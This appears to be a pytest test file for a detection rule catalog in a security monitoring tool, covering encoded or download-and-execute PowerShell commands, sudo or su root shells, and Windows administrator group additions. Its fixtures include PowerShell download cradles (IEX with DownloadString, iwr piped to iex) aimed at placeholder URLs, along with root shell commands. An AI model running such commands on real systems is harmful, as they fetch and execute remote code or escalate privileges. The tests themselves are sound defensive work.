"""Positive source facts and false-positive boundaries for the fixed rule catalog."""

import json
from copy import deepcopy
from dataclasses import FrozenInstanceError
from datetime import UTC, datetime
from typing import Any
from uuid import UUID

import pytest

from app.modules.detections.builtin import (
    BUILTIN_RULES,
    EVALUATOR_VERSION,
    MAX_COMMAND_LENGTH,
    evaluate,
    evaluate_rule,
)
from app.modules.normalization.parsers import NormalizationContext, normalize

ENCODED = "RwBlAHQALQBEAGEAdABlAA=="  # Get-Date; authorized encoding can also match.
PS_ID = "powershell-suspicious-command"
LINUX_ID = "linux-root-session"
ADMIN_ID = "windows-local-admin-member-added"


def normalized(raw: Any, source_type: str, *, timestamp: str | None = None) -> dict[str, Any]:
    context = NormalizationContext(
        event_id=UUID(int=1),
        source_id=UUID(int=2),
        dataset_id=UUID(int=3),
        run_id=UUID(int=0),
        source_event_id="original-42",
        mode="live",
        source_name="źródło testowe",
        source_type=source_type,
        timezone="UTC",
        received_at=datetime(2026, 1, 1, tzinfo=UTC),
        processed_at=datetime(2026, 1, 1, 0, 0, 1, tzinfo=UTC),
        raw_sha256="ab" * 32,
    )
    envelope = {"source_type": source_type, "raw_event": raw}
    if timestamp is not None:
        envelope["timestamp"] = timestamp
    return normalize(envelope, context).model_dump(mode="json")


def powershell(command: str | None, *, code: str = "4688") -> dict[str, Any]:
    if code == "1":
        raw = {
            "EventID": 1,
            "ProviderName": "Microsoft-Windows-Sysmon",
            "Computer": "STACJA-1",
            "EventData": {
                "Image": r"C:\Program Files\PowerShell\7\pwsh.exe",
                "CommandLine": command,
                "User": "FIRMA\\Paweł",
            },
        }
    else:
        raw = {
            "EventID": 4688,
            "Computer": "STACJA-1",
            "EventData": {
                "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": command,
                "SubjectUserName": "Paweł",
            },
        }
    return normalized(raw, "windows_process")


def sudo(command: str, *, actor: str = "Łucja", target: str = "root") -> dict[str, Any]:
    return normalized(
        f"Jan  1 00:00:00 bastion sudo[444]: {actor} : TTY=pts/0 ; "
        f"PWD=/home/{actor} ; USER={target} ; COMMAND={command}",
        "linux_auth",
    )


def member_added(
    *, group_id: str = "S-1-5-32-544", group_name: str = "Administratorzy", missing: bool = False
) -> dict[str, Any]:
    values: dict[str, Any] = {"TargetSid": group_id, "TargetUserName": group_name}
    if not missing:
        values.update(
            MemberSid="S-1-5-21-1-1234",
            SubjectUserSid="S-1-5-21-1-500",
            SubjectUserName="Łucja",
            SubjectDomainName="FIRMA",
        )
    return normalized({"EventID": 4732, "EventData": values}, "windows_auth")


def test_fixed_catalog_metadata_is_json_serializable_immutable_and_versioned() -> None:
    assert [rule.id for rule in BUILTIN_RULES] == [PS_ID, LINUX_ID, ADMIN_ID]
    assert EVALUATOR_VERSION == "single-event-v1"
    for rule in BUILTIN_RULES:
        assert rule.version == "1.0.0"
        snapshot = rule.snapshot()
        assert snapshot["type"] == "single_event"
        assert snapshot["evaluator_version"] == EVALUATOR_VERSION
        assert snapshot["false_positive_guidance"]
        assert all(reference.startswith("https://") for reference in snapshot["references"])
        assert json.loads(json.dumps(snapshot)) == snapshot
        snapshot["title"] = "changed"
        snapshot["references"].clear()
        snapshot["mitre"].append("invented")
        assert rule.snapshot()["title"] == rule.title
        assert rule.snapshot()["references"]
        assert "invented" not in rule.snapshot()["mitre"]
        with pytest.raises(FrozenInstanceError):
            rule.title = "changed"  # type: ignore[misc]
    assert BUILTIN_RULES[1].mitre == ()  # A su session is not evidence of sudo abuse.


@pytest.mark.parametrize(
    "command",
    [
        f"powershell.exe -EncodedCommand {ENCODED}",
        f"PoWeRsHeLl.ExE -NoProfile -ENC {ENCODED}",
        f'"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -WindowStyle Hidden -enc "{ENCODED}"',
        f"-EncodedCommand {ENCODED}",  # Collectors can retain only process arguments.
    ],
)
def test_powershell_encoded_cli_parameter_produces_one_explained_signal(command: str) -> None:
    document = powershell(command)
    matches = evaluate(document)
    assert len(matches) == 1 and matches[0].rule.id == PS_ID
    reason = matches[0].reason
    assert reason["code"] == "encoded_command_argument"
    assert reason["matched_fields"]["process.command_line"] == command
    assert reason["matched_fields"]["event.code"] == "4688"
    assert reason["summary"] and "nie została wykonana" in reason["summary"]
    assert matches == evaluate_rule(PS_ID, document)


def test_sysmon_process_creation_uses_same_rule_without_duplicate_match() -> None:
    matches = evaluate(powershell(f"pwsh.exe -enc {ENCODED}", code="1"))
    assert len(matches) == 1
    assert matches[0].rule.id == PS_ID
    assert matches[0].reason["matched_fields"]["event.code"] == "1"


@pytest.mark.parametrize(
    "script",
    [
        "IEX ((New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1'))",
        "Invoke-Expression ([Net.WebClient]::new().DownloadString('https://example.invalid/x'))",
        "iwr 'https://example.invalid/a.ps1' | iex",
        "Invoke-WebRequest -Uri 'https://example.invalid/a.ps1' | Invoke-Expression",
    ],
)
def test_powershell_download_and_expression_signatures_ignore_literal_url(script: str) -> None:
    matches = evaluate(powershell(f'powershell.exe -NoProfile -Command "{script}"'))
    assert len(matches) == 1 and matches[0].rule.id == PS_ID
    assert matches[0].reason["code"] == "download_and_execution_indicators"
    assert "nie potwierdza" in matches[0].reason["summary"]


@pytest.mark.parametrize(
    "command",
    [
        None,
        "powershell.exe -NoProfile -Command Get-Date",
        "powershell.exe -EncodedCommand",
        'powershell.exe -enc ""',
        "powershell.exe -enc not-base64",
        "powershell.exe -enc AAA",  # Missing padding.
        "powershell.exe -enc AB==",  # Noncanonical padding bits.
        "powershell.exe --EncodedCommand AAAA",
        f"powershell.exe -File benign.ps1 -enc {ENCODED}",
        f"powershell.exe -Command \"Write-Output '-EncodedCommand {ENCODED}'\"",
        f"powershell.exe -Command \"'-EncodedCommand {ENCODED}'\"",
        f'powershell.exe -WindowStyle "-enc" {ENCODED}',
        f"powershell.exe -Unknown literal -enc {ENCODED}",
        "powershell.exe -Command \"Write-Output 'IEX (x.DownloadString(y))'\"",
        "powershell.exe -Command \"Write-Output 'iwr https://example.invalid | iex'\"",
        'powershell.exe -Command "# IEX (x.DownloadString(y))"',
        'powershell.exe -Command "iwr https://example.invalid"',
        'powershell.exe -Command "IEX $approved_script"',
        'powershell.exe -Command "Write-Output IEX (x.DownloadString(y))"',
        'powershell.exe -Command "I`EX (x.DownloadString(y))"',
        'powershell.exe -Command "IEX (x.DownloadString(y))',  # Unclosed CLI quote.
    ],
)
def test_benign_or_unsupported_powershell_commands_do_not_match(command: str | None) -> None:
    assert evaluate(powershell(command)) == []


@pytest.mark.parametrize("name", ["notpowershell.exe", "cmd.exe", "powershell.exe.bak"])
def test_another_process_with_powershell_text_is_not_powershell(name: str) -> None:
    document = powershell(f"powershell.exe -enc {ENCODED}")
    document["process"]["name"] = name
    document["process"]["executable"] = "C:\\Tools\\" + name
    assert evaluate(document) == []


def test_conflicting_executable_identity_and_non_process_event_do_not_match() -> None:
    document = powershell(f"powershell.exe -enc {ENCODED}")
    document["process"]["executable"] = r"C:\Tools\cmd.exe"
    assert evaluate(document) == []
    document = powershell(f"powershell.exe -enc {ENCODED}")
    document["event"]["action"] = "process_stopped"
    assert evaluate(document) == []
    document["event"]["action"] = "process_started"
    document["event"]["outcome"] = "failure"
    assert evaluate(document) == []


@pytest.mark.parametrize("command", ["/bin/bash", "'/bin/sh' -i", "/usr/bin/zsh --login -i"])
def test_sudo_root_shell_signal_preserves_unicode_actor_and_exact_command(command: str) -> None:
    matches = evaluate(sudo(command))
    assert len(matches) == 1 and matches[0].rule.id == LINUX_ID
    assert matches[0].reason["code"] == "sudo_root_shell_command"
    assert matches[0].reason["matched_fields"] == {
        "user.name": "Łucja",
        "user.target.name": "root",
        "process.command_line": command,
        "event.action": "sudo_command",
    }


@pytest.mark.parametrize(
    "command",
    [
        "/usr/bin/id",
        "/usr/bin/systemctl restart nginx",
        "/bin/bash -c /usr/bin/id",
        "/bin/sh /opt/maintenance.sh",
        "/bin/bash -ic id",
        "/bin/bash -c 'echo shell'",
        "/bin/bash --norc maintenance.sh",
        "/usr/bin/sudo /bin/bash",
        "/bin/BASH",
        '"/bin/bash',
    ],
)
def test_regular_sudo_commands_and_noninteractive_scripts_do_not_match(command: str) -> None:
    assert evaluate(sudo(command)) == []


@pytest.mark.parametrize("actor", ["root", ""])
def test_sudo_requires_known_non_root_actor(actor: str) -> None:
    document = sudo("/bin/bash")
    document["user"]["name"] = actor or None
    assert evaluate(document) == []


def test_sudo_requires_root_target_and_successful_outcome() -> None:
    assert evaluate(sudo("/bin/bash", target="service")) == []
    document = sudo("/bin/bash")
    document["event"]["outcome"] = "failure"
    assert evaluate(document) == []
    document["event"]["outcome"] = "success"
    document["user"]["target"]["name"] = None
    assert evaluate(document) == []


def test_su_root_opening_reports_session_fact_without_claiming_shell_execution() -> None:
    document = normalized(
        "Jan  1 00:00:00 bastion su[445]: pam_unix(su:session): "
        "session opened for user root(uid=0) by Paweł(uid=1000)",
        "linux_auth",
    )
    matches = evaluate(document)
    assert len(matches) == 1 and matches[0].rule.id == LINUX_ID
    assert matches[0].reason["code"] == "root_su_session_opened"
    assert "nie potwierdza uruchomienia powłoki" in matches[0].reason["summary"]
    assert matches[0].reason["matched_fields"]["user.name"] == "Paweł"


@pytest.mark.parametrize(
    "message",
    [
        "session closed for user root by alice",
        "session opened for user service by alice",
        "session opened for user root by root",
        "session opened for user root",
        "FAILED SU (to root) alice on pts/0",
    ],
)
def test_su_close_failure_and_missing_or_ineligible_accounts_do_not_match(message: str) -> None:
    assert evaluate(normalized("Jan  1 00:00:00 bastion su[445]: " + message, "linux_auth")) == []


@pytest.mark.parametrize("name", ["Administratorzy", "Administrateurs", "任意の名前"])
def test_local_administrator_group_uses_sid_not_localized_name(name: str) -> None:
    matches = evaluate(member_added(group_name=name))
    assert len(matches) == 1 and matches[0].rule.id == ADMIN_ID
    fields = matches[0].reason["matched_fields"]
    assert fields["extensions.group.id"] == "S-1-5-32-544"
    assert fields["extensions.group.name"] == name
    assert fields["user.target.id"] == "S-1-5-21-1-1234"
    assert fields["user.id"] == "S-1-5-21-1-500"
    assert fields["user.name"] == "Łucja"


def test_group_named_administrators_with_another_sid_does_not_match() -> None:
    assert evaluate(member_added(group_id="S-1-5-32-545", group_name="Administrators")) == []
    document = member_added()
    document["extensions"]["group"]["id"] = None
    assert evaluate(document) == []


def test_missing_member_actor_and_host_are_not_invented_for_group_fact() -> None:
    document = member_added(missing=True)
    matches = evaluate(document)
    assert len(matches) == 1
    fields = matches[0].reason["matched_fields"]
    assert fields["user.target.id"] is None
    assert fields["user.id"] is None and fields["user.name"] is None
    assert document["host"]["id"] is None and document["host"]["name"] is None
    assert "nie wnioskuje o utworzeniu nowego konta" in matches[0].reason["summary"]


def test_account_creation_alone_does_not_invent_administrator_membership() -> None:
    document = normalized(
        {"EventID": 4720, "EventData": {"TargetSid": "S-1-5-21-1-1234"}}, "windows_auth"
    )
    assert evaluate(document) == []
    document = member_added()
    document["event"]["outcome"] = "failure"
    assert evaluate(document) == []


@pytest.mark.parametrize(
    "document",
    [powershell(f"powershell.exe -enc {ENCODED}"), sudo("/bin/bash"), member_added()],
)
def test_rule_evaluation_is_deterministic_without_clocks_or_input_mutation(
    document: dict[str, Any],
) -> None:
    before = deepcopy(document)
    expected = evaluate(document)
    assert expected and evaluate(document) == expected and document == before
    changed_time = deepcopy(document)
    changed_time.update(
        timestamp="2099-01-01T00:00:00Z",
        received_at="2001-01-01T00:00:00Z",
        processed_at="2099-01-01T01:00:00Z",
        quality=["timestamp_from_received_at", "missing_source_timestamp"],
        mode="replay",
        run_id=str(UUID(int=99)),
    )
    assert evaluate(changed_time) == expected  # Source fact predicates have no time windows.
    assert changed_time["quality"] == ["timestamp_from_received_at", "missing_source_timestamp"]
    expected[0].reason["matched_fields"].clear()
    assert document == before and evaluate(document)[0].reason["matched_fields"]


def test_invalid_schema_malformed_fields_and_oversized_command_fail_closed() -> None:
    document = powershell(f"powershell.exe -enc {ENCODED}")
    document["schema_version"] = "unexpected"
    assert evaluate(document) == []
    document["schema_version"] = "1.0"
    document["process"]["command_line"] = "powershell.exe -enc " + "A" * MAX_COMMAND_LENGTH
    assert evaluate(document) == []
    document["process"]["command_line"] = ["powershell.exe", "-enc", ENCODED]
    assert evaluate(document) == []
    document["event"]["code"] = ["4688"]
    assert evaluate(document) == []
    document["source"] = None
    assert evaluate(document) == []
    assert evaluate({"schema_version": "1.0"}) == []


def test_large_nonmatching_command_and_many_pipeline_segments_are_bounded() -> None:
    script = "(iwr " * 1500
    assert len(script) < MAX_COMMAND_LENGTH - 32
    assert evaluate(powershell(f'powershell.exe -Command "{script}"')) == []
    command = "powershell.exe -Command " + " | ".join(["iwr x"] * 900)
    assert len(command) < MAX_COMMAND_LENGTH
    assert evaluate(powershell(command)) == []


def test_unknown_rule_id_has_bounded_error_without_echoing_untrusted_identifier() -> None:
    with pytest.raises(ValueError, match="^unknown_builtin_rule$"):
        evaluate_rule("unknown<script>private", member_added())
